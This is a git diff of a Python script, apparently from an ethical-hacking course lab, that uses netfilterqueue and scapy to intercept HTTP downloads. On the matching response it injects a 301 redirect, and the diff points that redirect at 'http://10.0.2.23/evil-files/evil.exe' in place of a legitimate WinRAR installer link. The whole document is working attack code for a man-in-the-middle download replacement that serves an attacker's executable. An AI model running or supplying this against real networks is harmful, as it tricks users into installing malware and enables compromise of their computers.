@@ -2,6 +2,12 @@ import netfilterqueue
 import scapy.all as scapy
 
 ack_list = []
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
@@ -14,12 +20,13 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+]Replacing file")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar601.exe\n\n"
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.23/evil-files/evil.exe\n\n")
+                packet.set_payload(str(modified_packet))
+
+
     packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
+
+
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
